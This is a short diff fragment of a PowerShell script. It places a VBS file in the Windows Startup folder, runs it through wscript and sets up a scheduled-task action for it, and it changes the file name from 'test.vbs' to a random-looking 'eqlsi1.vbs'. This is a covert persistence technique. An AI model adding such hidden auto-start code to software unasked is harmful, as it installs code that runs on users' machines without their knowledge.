@@ -20,7 +20,7 @@ Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWin
 
 
 # Set the full script path
-$scriptPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
+$scriptPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\eqlsi1.vbs"
 
 # Create the action
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$scriptPath`""
